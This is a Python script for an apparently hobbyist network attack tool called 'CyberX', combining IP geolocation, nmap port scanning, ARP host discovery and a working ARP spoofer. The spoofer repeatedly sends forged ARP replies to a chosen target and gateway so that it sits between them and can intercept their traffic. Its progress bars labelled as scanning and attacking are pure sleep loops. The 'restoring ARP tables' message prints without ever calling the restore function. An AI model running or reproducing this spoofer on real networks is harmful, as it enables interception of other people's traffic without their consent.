
import os
# from termcolor import colored,cprint
import sys
import requests
import socket
import json
import nmap
from nmap import PortScanner
import scapy.all as scapy
import argparse
import time
from pyfiglet import figlet_format
from rich.console import Console
from os import walk
from rich.progress import Progress,track

def astdisplay():
    con = Console()
    con.print("HELLO WORLD", style="bold green")
    # banner
    # big
    # block
    # bubble
    # circle
    # digital
    # emboss
    # emboss2
    # future
    # ivrit
    # lean
    # letter
    # mini
    # mnemonic
    # pagga
    # script
    # shadow
    # slant
    # small
    # smblock
    # smbraille
    # smscript
    # smshadow
    # smslant
    # standard
    # term
    # wideterm

    banner = figlet_format("C Y B E R  X", font="slant")
    # then printing that out with rich console and a little intro
    con.print(banner,"MODERN ATTACKS ON NETWORKS ",
              style="bold red")


def web_hacking():
  con = Console()
  for x in track(range(100),"STARTING NETWORK SCAN "):
    time.sleep(0.1)
  for i in track(range(100),"GATHERING INFORMATION FORM IP "):
    time.sleep(0.1)
  for v in track(range(100),"GENERATING ATTACK ON NETWORK "):
    time.sleep(0.1)
  for w in track(range(100),"SHOWING RESULTS "):
    time.sleep(0.1)



def display_result(result):
    print("-----------------------------------\nIP Address\tMAC Address\n-----------------------------------")
    for i in result:
        print("{}\t{}".format(i["ip"], i["mac"]))



def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target', help='Target IP Address/Adresses')
    options = parser.parse_args()

    # Check for errors i.e if the user does not specify the target IP Address
    # Quit the program if the argument is missing
    # While quitting also display an error message
    if not options.target:
        # Code to handle if interface is not specified
        parser.error("[-] Please specify an IP Address or Addresses, use --help for more info.")
    return options


def scan(ip):
    arp_req_frame = scapy.ARP(pdst=ip)
    # print(scapy.ls(scapy.ARP()))

    broadcast_ether_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame

    answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout=1, verbose=False)[0]
    result = []
    for i in range(0, len(answered_list)):
        client_dict = {"ip": answered_list[i][1].psrc, "mac": answered_list[i][1].hwsrc}
        result.append(client_dict)

    return result


def location(option):
    req = requests.get("https://" + option)
    print(req)

    gethostby = socket.gethostbyname(option)
    print("\nThe IP address of " + option + " is: " + gethostby + "\n")

    # ipinfo.io

    req_two = requests.get("https://ipinfo.io/" + gethostby + "/json")

    resp_ = json.loads(req_two.text)

    print("location " + resp_['loc'])
    print("region " + resp_['region'])
    print("City: " + resp_['city'])
    print("Country: " + resp_['country'])


def portscan(user_input):
    target = str(user_input)
    while True:
        print("""
           1. Scan All Known Ports
           2. Enter ports Manually
           """)
        choice = input("Your choice here : ")
        try:
            if choice =="1":
              ports = [21, 22, 80, 139, 443, 8080, 27]
              break
            if  choice == "2":
                while True:
                    strq = input("please enter ports separated by commas e.g 21,22,80: ")
                    try:
                        ans = strq.split(',')
                        ports = [int(port) for port in ans]
                        break
                    except:
                        print("Please separate your entries with commas ")
                        continue

        except:
            print("Choose correct option !")
            continue




    target = socket.gethostbyname(user_input)
    scan_v = PortScanner()


    print("\nScanning", target, ports)
    web_hacking()

    for port in ports:
        portscan = scan_v.scan(target, str(port))
        print("Port", port, "is", portscan['scan'][target]['tcp'][port]['state'])

    print("\nHost", target, " is ", portscan['scan'][target]['status']['state'])

# def get_arguments():
#     parser = argparse.ArgumentParser()
#     parser.add_argument("-t", "--target", dest="target", help="Specify target ip")
#     parser.add_argument("-g", "--gateway", dest="gateway", help="Specify spoof ip")
#     return parser.parse_args()

def get_mac(ip):
    # arp_packet = scapy.ARP(pdst=ip)
    # broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # arp_broadcast_packet = broadcast_packet/arp_packet
    # answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
    # return answered_list[0][1].hwsrc
    mac = "xx"
    while mac == "xx":
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            mac = answered_list[0][1].hwsrc
            # print(mac)
        except:
            pass
        finally:
            return mac

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, 4)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def main():
    if os.geteuid() != 0:
        exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo' Exiting.")
    if len(sys.argv) > 1 and len(sys.argv) < 2:
        if sys.argv[1] == '--help':
            print("""
                cyberx.py --<Function to user>
                1- Geo_Locater
                2- Port_Scanner
                3- ARP_Scanner
                4- ARP_Spoofer
                
                """)
            exit()
    elif len(sys.argv) < 2:
        print("""
                        python cyberx.py --<Function to user>
                        1- Geo_Locater
                        2- Port_Scanner
                        3- ARP_Scanner
                        4- ARP_Spoofer
                        """)
        exit()
    else:

        i = (sys.argv[1])
        astdisplay()

    if i == '--Geo_Locater':
        option = input("Enter IP Address / URL : ")
        web_hacking()
        location(option)
    elif i == '--Port_Scanner':
        options = input("Enter IP Address / URL : ")
        portscan(options)
    elif i == '--ARP_Scanner':

        while True:

            options = input("Enter ip address/ip address seprated by ',' | or Enter URL : ")
            web_hacking()
            try:

                ans = options.split(',')
                for ip in ans:
                    print(ip)
                    scanned_output = scan(ip)
                    display_result(scanned_output)
                break
            except:
                try:
                    gethostby = socket.gethostbyname(options)
                    for ip in ans:
                        print(ip)
                        scanned_output = scan(ip)
                        display_result(scanned_output)
                except:
                    continue

    elif i == '--ARP_Spoofer':
        target = input("Enter Target : ")
        gateway = input("Enter Gateway: ")
        sent_packets = 0
        for x in track(range(100), "Spoofing ARP "):
            time.sleep(0.1)
        try:
            while True:
                spoof(target,gateway)
                spoof(gateway,target)
                sent_packets += 2
                print("\r[+] Sent packets: " + str(sent_packets))
                sys.stdout.flush()
                time.sleep(2)

        except KeyboardInterrupt:
            print("\n[-] Ctrl + C detected.....Restoring ARP Tables Please Wait!")



try:
    main()
except KeyboardInterrupt:
    print("\n[-] Ctrl + C detected.....Exiting")



